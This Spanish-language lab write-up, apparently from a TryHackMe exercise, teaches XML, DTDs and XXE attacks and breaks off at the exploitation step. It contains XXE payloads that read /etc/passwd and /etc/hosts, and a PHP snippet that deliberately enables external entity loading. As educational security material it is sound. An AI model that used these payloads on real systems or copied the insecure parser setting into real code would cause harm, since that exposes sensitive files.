# Objetivos de aprendizaje

- Conceptos básicos relacionados con XML
- Explorar XML y (XXE) en los componentes
- Aprender como explotar vulnerabilidaes
- Entender formas de remediar el ataque

# Conceptos importantes

Extensible Markup Language (XML)

XML es comunmente utilizado para transportar y guardar datos de forma estructurada para que humanos y máquinas lo puedan entender. Considera un escenario donde dos ordenadores necesitan comunicarse y guardar datos.

La comunicación entre los dos comunmente es un cambio de información. Esto se hace es formato XML. Usando "tags" para la información de la organización. Estos tags son como archivos que definen este tipo de datos guardados.

```
<people>
   <name>Glitch</name>
   <address>Wareville</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

En este caso los tags "people", "name", "addres" son como carpetas en una cabina, y luego dentro el contenido que tienen "glitch" etc representa los datos guardados. 

Document Type Definition (DTD) 

Ahora que sabemos como guardar datos entre dos ordenadores, que sabemos sobre su estructura? aqui es donde utilizaremos DTD. DTD coge una serie de reglas y define la estructura del documentos XML. Es como el esquema de una base de datos.

Por ejemplo si queremos asegurarnos que un documento XML sobre gente debe incluir siempre "name" "address" "enaim" 

```
<!DOCTYPE people [
   <!ELEMENT people(name, address, email, phone)>
   <!ELEMENT name (#PCDATA)>
   <!ELEMENT address (#PCDATA)>
   <!ELEMENT email (#PCDATA)>
   <!ELEMENT phone (#PCDATA)>
]>
```

Donde vemos "Element "define el elemento el tag como nombre, dirección ,etc dentro de los datos peopple

### Entidades

Tenemos que tener en cuenta que ambos ordenadores permitan el foramto, los datos estrucutrados y los tipos de daots. Normalmente siempre es así

Las entidades se pueden definir intenranmente con el documento o externamente, referenciado a datos de otro codigo

Por ejemplo, una entidad enterna refiere a un archivo o recurso externo. Si seguimos el codigo seguramente veamos "&ext& refiriendose al archivo por jeemplo "http://tryhackme.com/robots.txt"

```
<!DOCTYPE people [
   <!ENTITY ext SYSTEM "http://tryhackme.com/robots.txt">
]>
<people>
   <name>Glitch</name>
   <address>&ext;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

### XML External Entity (XXE)

Depués de entender XML y como funcionan las entidades, vamos a explorar las vulnerablidades XXE. Es una foram de ataque en el que manejamos con entidades externas. Donde la aplicacion web procesa un archivo externo. 

Por ejemplo

```
<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Glitch</name>
   <address>&thmFile;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

Como podemos ver la entidad "&thmFile" se refiere al archivo sensible /etc/passwd de lsistema.

# Practico

Ahora que hemos entendido los conceptos vamos a ello

```
http://10.10.107.21
```

![image](https://github.com/user-attachments/assets/92cbac48-5f43-4210-afe1-284e66f989f2)

## Flujo de la aplicación

Como Penetration tester, es importante analizar la aplicación, primero buscaremos en el navegador donde estan dichos productos

```
http://ip/product.php
```

![image](https://github.com/user-attachments/assets/079314eb-43f7-41f0-9d98-095b0c81ae64)

Despues de añadir un producto por ejemplo, nos vamos a al buzon

```
http://ip/cart.php
```

![image](https://github.com/user-attachments/assets/857de163-e9f6-4034-8346-cf6d47402e69)

Procedemos al checkout

![image](https://github.com/user-attachments/assets/21800431-e936-4ed0-9189-71a6bc595eba)

![image](https://github.com/user-attachments/assets/3f3e77c9-45f1-4516-a1f3-47a39bca2df9)

Nos da un Wish #21 indicando que esta en la web pero no hay nada solo es accesible parece ser por admin

![image](https://github.com/user-attachments/assets/d0222382-afbf-4202-b4ff-5c19d7686545)

## Interceptar la request

Antes de explotar cualquier vulnerabilidad vamos a interceptar las consultar y vamos a configurar y manipular el navegador (BurpSuite)

Visitaremos la URL 

```
http://ip/product.php
```
```
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>1</product_id>
     </item>
</wishlist>
```

Esto es el wishlist.php

```
<?php
..
...
libxml_disable_entity_loader(false);
$wishlist = simplexml_load_string($xml_data, "SimpleXMLElement", LIBXML_NOENT);

...
..
echo "Item added to your wishlist successfully.";
?>
```

## Preparar el Payload

Cuando el usuario craftear datos con XML hay una linea "libxml_disable_entity_loader(false9" que se refiere a datos externos. Esto incluye datos o consultas a otros navegadores luego lo procede " simplexml_load_string" resolviendo consultas externas

Si nosotros lo actualizamos y cluimos referencias que puede pasar?

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

Cuando mandemos este payload nos saldra /etc/hosts

## Explotación

Ahora que tneemos ya el archivo y todo nos iremos a "repeater" dentro de wishlist.php




